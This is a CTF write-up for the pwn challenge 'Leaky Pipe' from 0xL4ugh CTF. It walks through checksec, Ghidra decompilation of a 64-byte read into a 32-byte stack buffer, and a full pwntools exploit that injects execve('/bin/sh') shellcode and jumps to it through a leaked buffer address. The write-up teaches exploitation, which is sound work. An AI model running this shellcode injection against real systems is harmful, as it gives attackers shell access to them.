---
title: "Leaky Pipe - 0xL4ugh CTF"
date: 2021-01-17T19:07:42+02:00
draft: false
enableToc: false
description: "In this challenge we recieved a binary in which we are asked to exploit and somehow retrieve the flag."
tags:
  - pwn
---
In this challenge we recieved a binary in which we are asked to exploit and somehow retrieve the flag.
you can find the binary for this challenge [here](https://github.com/hegzploit/0xL4ugh-Pwn-Challs)

## Initial Analysis

We start by running the binary and checking it behavior.
```
./leaky_pipe
We have just fixed the plumbing systm, let's hope there's no leaks!
>.> aaaaah shiiit wtf is dat address doin here...  0x7ffde7760410
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA <--- our input
Segmentation fault (core dumped)
```

And as we see, we can already get a segfault by spamming some A's in the input.

One intersting catch is that address in the output of the binary, we also note that it changes everytime we run the binary so the binary probably is a PIE (Position Independent Executable).

Let's run a checksec to make sure of our hypothesis.
```
gef➤  checksec
[+] checksec for '/vagrant/leaky_pipe/leaky_pipe'
Canary                        : ✘
NX                            : ✘
PIE                           : ✓
Fortify                       : ✘
RelRO                         : Partial
```

Seems like we have everything disabled except PIE just as predicted.

## Reversing the binary
Let's load the binary in ghidra and check the generated decompilation, sometimes this can save a lot of time trying to understand a disassembly.
```c++ {linenos=table}
undefined8 main(void)

{
  basic_ostream *pbVar1;
  basic_ostream<char,std::char_traits<char>> *this;
  ssize_t sVar2;
  undefined8 uVar3;
  undefined local_28 [32];
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,
                           "We have just fixed the plumbing systm, let\'s hope there\'s no leaks!");
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
             std::endl<char,std::char_traits<char>>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,
                           ">.> aaaaah shiiit wtf is dat address doin here...  ");
  this = (basic_ostream<char,std::char_traits<char>> *)
         std::basic_ostream<char,std::char_traits<char>>::operator<<
                   ((basic_ostream<char,std::char_traits<char>> *)pbVar1,local_28);
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            (this,std::endl<char,std::char_traits<char>>);
  sVar2 = read(0,local_28,0x40);
  if (sVar2 < 5) {
    pbVar1 = std::operator<<((basic_ostream *)std::cout,"no smol input plz");
    std::basic_ostream<char,std::char_traits<char>>::operator<<
              ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
               std::endl<char,std::char_traits<char>>);
    uVar3 = 0xffffffff;
  }
  else {
    uVar3 = 0;
  }
  return uVar3;
}
```
The binary is fairly simple to reverse, it's written in C++ so the decompilation may seem overwhelming at the first glance but its actually quite simple!

We are intersted in the part at **line 16** where it reads 0x40 bytes from STDIN to the buffer named local_28.
```c++
  sVar2 = read(0,local_28,0x40);
```
On checking the variable local_28 we can see that it's only 32 bytes long and we are trying to read 64 (0x40) bytes into it, and that's why we got a segfault.
```c++
  undefined local_28 [32];
```

One more thing we notice on analyzing the decompilation is the address we saw at the output of the binary, here is the part we are intersted in.
```c++
this = (basic_ostream<char,std::char_traits<char>> *)
       std::basic_ostream<char,std::char_traits<char>>::operator<<
       ((basic_ostream<char,std::char_traits<char>> *)pbVar1,local_28);
```
Seems like it's printing a pointer to the buffer local_28!
This is just too good to be true at this point, we have a leaked address of a buffer that we control.
If we recall our checksec result we saw that NX-bit was not set so this meaning we can execute arbitrary shellcode on the stack.
Let's fireup our editor and start creating the exploit using a 64-bit execve(*"/bin/sh/") shellcode.

```python
from pwn import *
context.binary = 'leaky_pipe'
OFFSET = 40

if args['REMOTE']:
    io = remote('ctf.0xl4ugh.com', 4141)
else:
    io = process('leaky_pipe')

# Extract the buffer address that is leaked so we can use it in our exploit
print(io.recvuntil("..."))
address = io.recvlineS().strip()
address = int(address,0)

# Shellcode from https://www.exploit-db.com/exploits/42179

# We start filling the buffer with our shellcode 
# and the remaining bytes are padded with A's.
payload = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload += (b"A"* (40 - len(payload)))

# We then overwrite the return adderss with the leaked address
# which is the start of our shellcode.
payload += p64(address)

io.sendline(payload)
io.interactive()
```

